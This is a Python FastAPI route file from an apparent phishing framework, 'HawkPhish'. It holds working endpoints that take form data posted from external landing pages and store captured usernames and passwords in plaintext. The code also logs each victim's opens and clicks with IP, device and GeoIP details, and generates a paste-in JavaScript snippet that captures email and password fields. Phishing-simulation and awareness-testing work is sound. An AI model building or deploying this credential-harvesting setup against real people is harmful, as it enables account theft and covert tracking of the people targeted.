"""HawkPhish - External Integration Routes (CORS-enabled for external landing pages)"""
from fastapi import APIRouter, Depends, HTTPException, Request
from fastapi.responses import JSONResponse
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select
from database import get_db
from models import EmailLog, Campaign, LandingPage, CredentialSubmit, RecipientSession
from services.tracking_service import TrackingService, parse_user_agent, geoip_lookup
from services.external_integration import generate_js_sdk, generate_tracking_link
from pydantic import BaseModel
from typing import Optional, Dict, List
from datetime import datetime

router = APIRouter(prefix="/api/external", tags=["External Integration"])


class ExternalTrackRequest(BaseModel):
    tracking_id: str
    event: str = "open"  # open, click, view
    url: Optional[str] = None
    referrer: Optional[str] = None
    user_agent: Optional[str] = None
    campaign_id: Optional[int] = None
    landing_page_id: Optional[int] = None
    ip_address: Optional[str] = None


class ExternalSubmitRequest(BaseModel):
    tracking_id: str
    data: Dict[str, str]  # All captured form fields
    campaign_id: Optional[int] = None
    landing_page_id: Optional[int] = None
    url: Optional[str] = None
    user_agent: Optional[str] = None
    ip_address: Optional[str] = None


@router.post("/track")
async def external_track(request: Request, data: ExternalTrackRequest, db: AsyncSession = Depends(get_db)):
    """Track opens and clicks from external landing pages (CORS-enabled)."""
    # Find the email log by tracking_id
    result = await db.execute(select(EmailLog).where(EmailLog.tracking_id == data.tracking_id))
    log = result.scalar_one_or_none()
    
    if not log:
        # Return 200 even if tracking_id not found (don't leak info)
        return JSONResponse({"status": "ok"})
    
    # Get IP from request if not provided
    ip = data.ip_address or (request.client.host if request.client else "")
    ua = data.user_agent or request.headers.get("user-agent", "")
    
    browser_info = parse_user_agent(ua)
    geo = await geoip_lookup(ip)
    
    if data.event == "open":
        log.open_count += 1
        if not log.opened_at:
            log.opened_at = datetime.utcnow()
            log.status = "opened"
            campaign = await db.get(Campaign, log.campaign_id)
            if campaign:
                campaign.total_opened += 1
    
    elif data.event == "click":
        log.click_count += 1
        if not log.clicked_at:
            log.clicked_at = datetime.utcnow()
            log.status = "clicked"
            campaign = await db.get(Campaign, log.campaign_id)
            if campaign:
                campaign.total_clicked += 1
    
    # Update log with latest info
    log.user_agent = ua
    log.ip_address = ip
    log.browser = browser_info["browser"]
    log.os = browser_info["os"]
    log.device = browser_info["device"]
    log.referrer = data.referrer or ""
    log.country = geo["country"]
    log.city = geo["city"]
    log.isp = geo["isp"]
    
    # Update session
    tracking = TrackingService(db)
    recipient = None
    if log.recipient_id:
        from models import Recipient
        recipient = await db.get(Recipient, log.recipient_id)
    
    session = await tracking._get_or_create_session(
        log.campaign_id, log.recipient_id or 0, 
        recipient.email if recipient else ""
    )
    
    event_data = {
        "ip": ip, "browser": browser_info["browser"], "os": browser_info["os"],
        "device": browser_info["device"], "country": geo["country"], "city": geo["city"],
        "isp": geo["isp"], "url": data.url or ""
    }
    
    from services.tracking_service import _make_event
    session_event = _make_event(data.event, event_data)
    tracking._add_event_to_session(session, session_event, ip, geo, browser_info)
    
    if data.event == "open":
        session.status = "opened"
    elif data.event == "click":
        session.status = "clicked"
    
    await db.commit()
    
    return JSONResponse({"status": "ok"})


@router.post("/submit")
async def external_submit(request: Request, data: ExternalSubmitRequest, db: AsyncSession = Depends(get_db)):
    """Capture credentials from external landing pages (CORS-enabled)."""
    # Find the email log by tracking_id
    result = await db.execute(select(EmailLog).where(EmailLog.tracking_id == data.tracking_id))
    log = result.scalar_one_or_none()
    
    if not log:
        # Return 200 even if not found
        return JSONResponse({"status": "ok"})
    
    # Get IP from request if not provided
    ip = data.ip_address or (request.client.host if request.client else "")
    ua = data.user_agent or request.headers.get("user-agent", "")
    
    browser_info = parse_user_agent(ua)
    geo = await geoip_lookup(ip)
    
    # Extract known fields
    email = (data.data.get("email") or data.data.get("username") or 
             data.data.get("user") or data.data.get("login") or "")
    password = (data.data.get("password") or data.data.get("pass") or 
                data.data.get("pwd") or "")
    
    # Collect extra fields
    capture_fields = ["email", "username", "user", "login", "password", "pass", "pwd", "tracking_id"]
    extra_data = {k: v for k, v in data.data.items() if k not in capture_fields and v}
    
    # Update log
    log.submitted_at = datetime.utcnow()
    log.status = "submitted"
    log.user_agent = ua
    log.ip_address = ip
    log.browser = browser_info["browser"]
    log.os = browser_info["os"]
    log.device = browser_info["device"]
    log.country = geo["country"]
    log.city = geo["city"]
    log.isp = geo["isp"]
    
    # Create credential submit
    submit = CredentialSubmit(
        campaign_id=log.campaign_id,
        recipient_id=log.recipient_id,
        email=email,
        password=password,
        data=extra_data,
        ip_address=ip,
        user_agent=ua,
    )
    db.add(submit)
    
    # Update campaign
    campaign = await db.get(Campaign, log.campaign_id)
    if campaign:
        campaign.total_submitted += 1
    
    # Update session
    tracking = TrackingService(db)
    recipient = None
    if log.recipient_id:
        from models import Recipient
        recipient = await db.get(Recipient, log.recipient_id)
    
    session = await tracking._get_or_create_session(
        log.campaign_id, log.recipient_id or 0,
        recipient.email if recipient else ""
    )
    
    from services.tracking_service import _make_event
    event_data = {
        "ip": ip, "email": email, "browser": browser_info["browser"], "os": browser_info["os"],
        "device": browser_info["device"], "country": geo["country"], "city": geo["city"],
        "isp": geo["isp"], "url": data.url or ""
    }
    if extra_data:
        event_data["extra"] = extra_data
    
    session_event = _make_event("submit", event_data)
    tracking._add_event_to_session(session, session_event, ip, geo, browser_info)
    session.status = "submitted"
    
    await db.commit()
    
    return JSONResponse({"status": "ok"})


@router.post("/generate-sdk")
async def generate_sdk(data: dict):
    """Generate a JavaScript SDK for external landing page integration."""
    base_url = data.get("base_url", "http://localhost:8000")
    campaign_id = data.get("campaign_id")
    landing_page_id = data.get("landing_page_id")
    capture_fields = data.get("capture_fields", ["email", "password"])
    redirect_url = data.get("redirect_url")
    
    sdk = generate_js_sdk(
        base_url=base_url,
        campaign_id=campaign_id,
        landing_page_id=landing_page_id,
        capture_fields=capture_fields,
        redirect_url=redirect_url,
    )
    
    return {"sdk": sdk, "instructions": "Paste this snippet before the closing </body> tag of your landing page."}


@router.post("/generate-link")
async def generate_link(data: dict):
    """Generate a tracking link for use in emails."""
    base_url = data.get("base_url", "http://localhost:8000")
    tracking_id = data.get("tracking_id", "")
    landing_page_id = data.get("landing_page_id")
    external_url = data.get("external_url")
    
    link = generate_tracking_link(base_url, tracking_id, landing_page_id, external_url)
    
    return {"link": link, "pixel": f"{base_url}/pixel/{tracking_id}"}


@router.get("/sdk.js")
async def get_sdk_js(
    base_url: str = "http://localhost:8000",
    campaign_id: Optional[int] = None,
    landing_page_id: Optional[int] = None,
    redirect: Optional[str] = None,
    fields: Optional[str] = "email,password",
):
    """Serve the JS SDK directly as a script file."""
    capture_fields = [f.strip() for f in fields.split(",") if f.strip()]
    
    sdk = generate_js_sdk(
        base_url=base_url,
        campaign_id=campaign_id,
        landing_page_id=landing_page_id,
        capture_fields=capture_fields,
        redirect_url=redirect,
    )
    
    from fastapi.responses import PlainTextResponse
    return PlainTextResponse(sdk, media_type="application/javascript")
